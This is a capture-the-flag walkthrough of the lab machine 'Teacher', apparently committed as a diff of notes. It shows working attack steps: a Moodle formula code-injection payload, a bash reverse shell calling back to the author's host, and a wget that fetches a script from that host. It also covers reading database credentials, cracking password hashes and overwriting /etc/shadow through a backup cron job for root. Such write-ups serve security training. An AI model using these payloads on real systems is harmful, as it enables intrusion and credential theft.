@@ -1,0 +1,388 @@
+Machine-Name  :  Teacher
+IP-Address    :  10.129.29.184
+
+Command-Line: sudo nmap -p- -T4 -A 10.129.29.184
+Result:
+    Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-08 15:57 UTC
+    Nmap scan report for 10.129.29.184
+    Host is up (0.046s latency).
+    Not shown: 65534 closed ports
+    PORT   STATE SERVICE VERSION
+    80/tcp open  http    Apache httpd 2.4.25 ((Debian))
+    |_http-server-header: Apache/2.4.25 (Debian)
+    |_http-title: Blackhat highschool
+    No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+    TCP/IP fingerprint:
+    OS:SCAN(V=7.91%E=4%D=4/8%OT=80%CT=1%CU=35163%PV=Y%DS=2%DC=T%G=Y%TM=606F2808
+    OS:%P=x86_64-pc-linux-gnu)SEQ(SP=108%GCD=1%ISR=10A%TI=Z%CI=I%II=I%TS=8)OPS(
+    OS:O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11
+    OS:NW7%O6=M54DST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN(
+    OS:R=Y%DF=Y%T=40%W=7210%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
+    OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
+    OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
+    OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
+    OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=
+    OS:S)
+
+    Network Distance: 2 hops
+
+    TRACEROUTE (using port 1723/tcp)
+    HOP RTT      ADDRESS
+    1   47.71 ms 10.10.14.1
+    2   47.74 ms 10.129.29.184
+
+    OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+    Nmap done: 1 IP address (1 host up) scanned in 38.60 seconds
+
+
+Command-Line: ./dirsearch.py -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e php,txt -f -t 50 -u http://10.129.29.184
+Result:
+      _|. _ _  _  _  _ _|_    v0.4.1
+     (_||| _) (/_(_|| (_| )
+
+    Extensions: php, txt | HTTP method: GET | Threads: 50 | Wordlist size: 882080
+
+    Error Log: /home/kali/HackingTools/dirsearch/logs/errors-21-04-08_16-12-05.log
+
+    Target: http://10.129.29.184/
+
+    Output File: /home/kali/HackingTools/dirsearch/reports/10.129.29.184/_21-04-08_16-12-05.txt
+
+    [16:12:05] Starting:
+    [16:12:06] 301 -  315B  - /images  ->  http://10.129.29.184/images/
+    [16:12:06] 200 -   15KB - /images/
+    [16:12:06] 403 -  294B  - /icons/
+    [16:12:08] 301 -  312B  - /css  ->  http://10.129.29.184/css/
+    [16:12:08] 200 -  932B  - /css/
+    [16:12:09] 301 -  315B  - /manual  ->  http://10.129.29.184/manual/
+    [16:12:09] 200 -  626B  - /manual/
+    [16:12:10] 200 -    1KB - /js/
+    [16:12:10] 301 -  311B  - /js  ->  http://10.129.29.184/js/
+    [16:12:10] 301 -  319B  - /javascript  ->  http://10.129.29.184/javascript/
+    [16:12:10] 403 -  299B  - /javascript/
+    [16:12:17] 200 -    3KB - /fonts/
+    [16:12:17] 301 -  314B  - /fonts  ->  http://10.129.29.184/fonts/
+    [16:12:52] 403 -  298B  - /phpmyadmin
+    [16:12:52] 403 -  299B  - /phpmyadmin/
+    [16:13:09] 301 -  315B  - /moodle  ->  http://10.129.29.184/moodle/
+    [16:13:09] 303 -  423B  - /moodle/  ->  http://teacher.htb/moodle
+    [16:19:07] 403 -  302B  - /server-status/
+    [16:19:07] 403 -  301B  - /server-status
+
+    Task Completed
+
+
+Browser: http://teacher.htb/images/
+Result:
+    /images.png
+Notes: Of all the images, one image file had an unusual size.
+
+Browser: http://teacher.htb/images/5.png
+Result:
+    Error-Message: The image “http://teacher.htb/images/5.png” cannot be displayed because it contains errors.
+
+Command-Line: curl http://teacher.htb/images/5.png -o 5.png
+Command-Line: cat 5.png
+Result:
+    Hi Servicedesk,
+
+    I forgot the last charachter of my password. The only part I remembered is Th4C00lTheacha.
+
+    Could you guys figure out what the last charachter is, or just reset it?
+
+    Thanks,
+    Giovanni
+
+Notes: Developer error. Possible password found minus one character at the end (Th4C00lTheacha).
+
+
+Broswer: http://teacher.htb/manual/
+Notes: Apache HTTP Server Version 2.4 (documentation page).
+
+Broswer: http://teacher.htb/moodle/
+Notes: Possible username found. "Teacher: Giovanni Chhatta". Clicked on link to login page for "Teachers".
+
+
+Command-Line: ./dirsearch.py -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e php,txt -f -t 50 -i 200 -u http://10.129.29.184/moodle
+Result:
+      _|. _ _  _  _  _ _|_    v0.4.1
+     (_||| _) (/_(_|| (_| )
+
+    Extensions: php, txt | HTTP method: GET | Threads: 50 | Wordlist size: 882080
+
+    Error Log: /home/kali/HackingTools/dirsearch/logs/errors-21-04-08_16-33-12.log
+
+    Target: http://10.129.29.184/moodle/
+
+    Output File: /home/kali/HackingTools/dirsearch/reports/10.129.29.184/moodle_21-04-08_16-33-13.txt
+
+    [16:33:13] Starting:
+    [16:33:13] 200 -    1KB - /moodle/rss/
+    [16:33:14] 200 -    1KB - /moodle/media/
+    [16:33:17] 200 -    0B  - /moodle/version.php
+    [16:33:18] 200 -    4KB - /moodle/report/
+    [16:33:18] 200 -    1KB - /moodle/local/
+    [16:33:18] 200 -    7KB - /moodle/pix/
+    [16:33:19] 200 -    2KB - /moodle/install/
+    [16:33:19] 200 -    1B  - /moodle/lib/
+    [16:33:20] 200 -    2KB - /moodle/portfolio/
+    [16:33:20] 200 -    1KB - /moodle/README.txt
+    [16:33:21] 200 -    3KB - /moodle/cache/
+    [16:33:22] 200 -    1KB - /moodle/lang/
+    [16:33:22] 200 -    1B  - /moodle/blocks/
+    [16:33:23] 200 -    6KB - /moodle/question/
+    [16:33:24] 200 -    4KB - /moodle/backup/
+    [16:33:25] 200 -    1B  - /moodle/filter/
+    [16:33:27] 200 -  664B  - /moodle/INSTALL.txt
+    [16:33:27] 200 -    0B  - /moodle/mod/
+    [16:33:28] 200 -    0B  - /moodle/auth/
+    [16:33:32] 200 -    7KB - /moodle/repository/
+    [16:33:37] 200 -   34KB - /moodle/COPYING.txt
+    [16:33:55] 200 -    1KB - /moodle/analytics/
+    [16:34:10] 200 -    2KB - /moodle/availability/
+    [16:34:28] 200 -    3KB - /moodle/webservice/
+    [16:35:12] 200 -    1KB - /moodle/plagiarism/
+    [16:39:20] 200 -    2KB - /moodle/competency/
+
+    Task Completed
+
+
+Notes: Trying to login through the Teachers login portal.
+URL: http://teacher.htb/moodle/login/index.php
+
+
+Notes: Wrote custom python3 script to crack the last character of the password.
+Script: /pw_cracker.py
+Result:
+    /password-cracked-1.png USERNAME: Giovanni PASS: Th4C00lTheacha#
+    /password-cracked-2.png USERNAME: giovanni PASS: Th4C00lTheacha#
+
+Notes: Capitalize-insensitive Username => "giovanni". Password => "Th4C00lTheacha#"  Logging in using credentials.
+Result:
+    *** SUCCESSFUL ***
+
+Broswer: moodle exploits
+URL: https://blog.ripstech.com/2018/moodle-remote-code-execution/
+Title: Evil Teacher: Code Injection in Moodle
+Notes:
+    "Moodle allows teachers to set up a quiz with many types of questions. Among them is the calculated question which allows teachers to enter a mathematical formula which will be evaluated by Moodle dynamically on randomized input variables ... would evaluate the answer 6.0 by calling the security sensitive PHP function eval() on the formula input which is well-known for its malicious potential as it allows execution of arbitrary PHP code."
+
+Actions-Taken: Clicked Algebra link. Clicked "Turn editing on". Created new Quiz. Created new Question (calculation).
+Answer-1-Formula: /*{a*/`$_REQUEST[cmd]`;//{x}}
+Command-Line: nc -lvnp 9001
+Notes: Turned on BurpSuite intercept, refreshed the moodle page and sent the request to Burp repeater. Appended to end of data request: &cmd=bash -c 'bash -i >& /dev/tcp/10.10.14.85/9001 0>&1'. Ctrl+U to URL-encode.
+Result:
+    *** REVERSE SHELL ***
+    www-data@teacher:/var/www/html/moodle/question$
+
+www-data@teacher:/var/www/html/moodle/question$ cd ../
+www-data@teacher:/var/www/html/moodle/$ cat config.php
+Results:
+    $CFG->dbtype    = 'mariadb';
+    $CFG->dblibrary = 'native';
+    $CFG->dbhost    = 'localhost';
+    $CFG->dbname    = 'moodle';
+    $CFG->dbuser    = 'root';
+    $CFG->dbpass    = 'Welkom1!';
+    $CFG->prefix    = 'mdl_';
+
+www-data@teacher:/var/www/html/moodle/$ mysql -u root -p
+Password: Welkom1!
+
+MariaDB: show databases;
+Result:
+    +--------------------+
+    | Database           |
+    +--------------------+
+    | information_schema |
+    | moodle             |
+    | mysql              |
+    | performance_schema |
+    | phpmyadmin         |
+    +--------------------+
+    5 rows in set (0.00 sec)
+
+MariaDB: use moodle;
+MariaDB [moodle]: show tables;
+Result:
+    Found "mdl_user"
+
+MariaDB [moodle]: describe mdl_user;
+Result:
+    -- username
+    -- password
+
+MariaDB [moodle]: select username, password from mdl_user;
+Result:
+    +-------------+--------------------------------------------------------------+
+    | username    | password                                                     |
+    +-------------+--------------------------------------------------------------+
+    | guest       | $2y$10$ywuE5gDlAlaCu9R0w7pKW.UCB0jUH6ZVKcitP3gMtUNrAebiGMOdO |
+    | admin       | $2y$10$7VPsdU9/9y2J4Mynlt6vM.a4coqHRXsNTOq/1aA6wCWTsF2wtrDO2 |
+    | giovanni    | $2y$10$38V6kI7LNudORa7lBAT0q.vsQsv4PemY7rf/M1Zkj/i1VqLO0FSYO |
+    | Giovannibak | 7a860966115182402ed06375cf0a22af                             |
+    +-------------+--------------------------------------------------------------+
+
+Command-Line: hash-identifier 7a860966115182402ed06375cf0a22af
+Result:
+    Possible Hashs:
+    [+] MD5
+    [+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))
+
+Command-Line: hashcat --example-hashes
+Command-Line: hashcat -m 0 7a860966115182402ed06375cf0a22af /usr/share/wordlists/rockyou.txt
+Result:
+    Watchdog: Hardware monitoring interface not found on your system.
+    Watchdog: Temperature abort trigger disabled.
+
+    Host memory required for this attack: 67 MB
+
+    Dictionary cache built:
+    * Filename..: /usr/share/wordlists/rockyou.txt
+    * Passwords.: 14344392
+    * Bytes.....: 139921507
+    * Keyspace..: 14344385
+    * Runtime...: 4 secs
+
+    7a860966115182402ed06375cf0a22af:expelled
+
+    Session..........: hashcat
+    Status...........: Cracked
+    Hash.Name........: MD5
+    Hash.Target......: 7a860966115182402ed06375cf0a22af
+    Time.Started.....: Sun Apr 11 05:17:36 2021 (0 secs)
+    Time.Estimated...: Sun Apr 11 05:17:36 2021 (0 secs)
+    Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+    Guess.Queue......: 1/1 (100.00%)
+    Speed.#1.........:  6811.3 kH/s (0.21ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
+    Recovered........: 1/1 (100.00%) Digests
+    Progress.........: 958464/14344385 (6.68%)
+    Rejected.........: 0/958464 (0.00%)
+    Restore.Point....: 946176/14344385 (6.60%)
+    Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+    Candidates.#1....: gaganu -> enamor
+
+    Started: Sun Apr 11 05:17:11 2021
+    Stopped: Sun Apr 11 05:17:36 2021
+
+Password-Cracked: "expelled"
+
+MariaDB [moodle]: quit
+
+www-data@teacher:/var/www/html/moodle/$ ls /home
+www-data@teacher:/var/www/html/moodle/$ su giovanni
+Password: expelled
+Result:
+    *** USER ACCESS ***
+
+giovanni@teacher:~$ cat user.txt
+Result: fa9ae187462530e841d9e61936648fa7
+    *** USER OWNED ***
+
+
+giovanni@teacher:/dev/shm$ wget http://10.10.14.85/LinEnum.sh
+Result:
+    /dev/shm/LinEnum.sh
+
+giovanni@teacher:/dev/shm$ chmod +x LinEnum.sh
+giovanni@teacher:/dev/shm$ ./LinEnum.sh
+Result:
+    [-] Kernel information (continued):
+    Linux version 4.9.0-8-amd64 (debian-kernel@lists.debian.org) (gcc version 6.3.0 20170516 (Debian 6.3.0-18+deb9u1) ) #1 SMP Debian 4.9.110-3+deb9u6 (2018-10-08)
+
+    [-] Listening TCP:
+    State      Recv-Q Send-Q Local Address:Port               Peer Address:Port
+    LISTEN     0      80     127.0.0.1:3306                     *:*
+    LISTEN     0      128          *:5355                     *:*
+    LISTEN     0      128         :::5355                    :::*
+    LISTEN     0      128         :::80                      :::*
+
+    [-] MYSQL version:
+    mysql  Ver 15.1 Distrib 10.1.26-MariaDB, for debian-linux-gnu (x86_64) using readline 5.2
+
+    [-] SUID files:
+    -rwsr-xr-x 1 root root 61240 Nov 10  2016 /bin/ping
+    -rwsr-xr-x 1 root root 40536 May 17  2017 /bin/su
+    -rwsr-xr-x 1 root root 30800 Jul 26  2018 /bin/fusermount
+    -rwsr-xr-x 1 root root 31720 Mar  7  2018 /bin/umount
+    -rwsr-xr-x 1 root root 44304 Mar  7  2018 /bin/mount
+    -rwsr-xr-x 1 root root 10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
+    -rwsr-xr-- 1 root messagebus 42992 Mar  2  2018 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+    -rwsr-xr-x 1 root root 440728 Aug 21  2018 /usr/lib/openssh/ssh-keysign
+    -rwsr-xr-x 1 root root 40312 May 17  2017 /usr/bin/newgrp
+    -rwsr-xr-x 1 root root 75792 May 17  2017 /usr/bin/gpasswd
+    -rwsr-xr-x 1 root root 40504 May 17  2017 /usr/bin/chsh
+    -rwsr-xr-x 1 root root 50040 May 17  2017 /usr/bin/chfn
+    -rwsr-xr-x 1 root root 59680 May 17  2017 /usr/bin/passwd
+
+    [-] Cron jobs:
+    -rw-r--r-- 1 root root  722 May  3  2015 /etc/crontab
+
+    /etc/cron.d:
+    total 16
+    drwxr-xr-x  2 root root 4096 Jun 27  2018 .
+    drwxr-xr-x 84 root root 4096 Apr 11 19:54 ..
+    -rw-r--r--  1 root root  712 Jan  1  2017 php
+    -rw-r--r--  1 root root  102 May  3  2015 .placeholder
+
+    /etc/cron.daily:
+    total 40
+    drwxr-xr-x  2 root root 4096 Oct 28  2018 .
+    drwxr-xr-x 84 root root 4096 Apr 11 19:54 ..
+    -rwxr-xr-x  1 root root  539 Mar 30  2018 apache2
+    -rwxr-xr-x  1 root root 1474 Sep 13  2017 apt-compat
+    -rwxr-xr-x  1 root root  355 Oct 25  2016 bsdmainutils
+    -rwxr-xr-x  1 root root 1597 Feb 22  2017 dpkg
+    -rwxr-xr-x  1 root root   89 May  6  2015 logrotate
+    -rwxr-xr-x  1 root root 1065 Dec 13  2016 man-db
+    -rwxr-xr-x  1 root root  249 May 17  2017 passwd
+    -rw-r--r--  1 root root  102 May  3  2015 .placeholder
+
+    /etc/cron.hourly:
+    total 12
+    drwxr-xr-x  2 root root 4096 Jun 27  2018 .
+    drwxr-xr-x 84 root root 4096 Apr 11 19:54 ..
+    -rw-r--r--  1 root root  102 May  3  2015 .placeholder
+
+    /etc/cron.monthly:
+    total 12
+    drwxr-xr-x  2 root root 4096 Jun 27  2018 .
+    drwxr-xr-x 84 root root 4096 Apr 11 19:54 ..
+    -rw-r--r--  1 root root  102 May  3  2015 .placeholder
+
+    /etc/cron.weekly:
+    total 16
+    drwxr-xr-x  2 root root 4096 Jun 27  2018 .
+    drwxr-xr-x 84 root root 4096 Apr 11 19:54 ..
+    -rwxr-xr-x  1 root root  723 Dec 13  2016 man-db
+    -rw-r--r--  1 root root  102 May  3  2015 .placeholder
+
+
+Notes: Nothing found with LinEnum.sh. pspy revealed a process running named: /usr/bin/backup.sh
+
+giovanni@teacher:/dev/shm$ cat /usr/bin/backup.sh
+Result:
+    #!/bin/bash
+    cd /home/giovanni/work;
+    tar -czvf tmp/backup_courses.tar.gz courses/*;
+    cd tmp;
+    tar -xf backup_courses.tar.gz;
+    chmod 777 * -R;
+
+Notes: After "cd" into "tmp". chmod is called to give rwx permissions to anyone who accesses the file.
+
+
+giovanni@teacher:/dev/shm$ cd ~/work
+giovanni@teacher:/home/giovanni/work$ ln -s /etc/shadow /home/giovanni/work/tmp
+Notes: Nano'd into /etc/shadow and replaced the root hash with giovanni's hash.
+giovanni@teacher:/home/giovanni/work$ su root
+Password: expelled
+Result:
+    *** ROOT ACCESS ***
+
+root@teacher:/home/giovanni/work# cat /root/root.txt
+Result: 4f3a83b42ac7723a508b8ace7b8b1209
+    *** ROOT OWNED ***
+
+
+      *** FINISHED ***
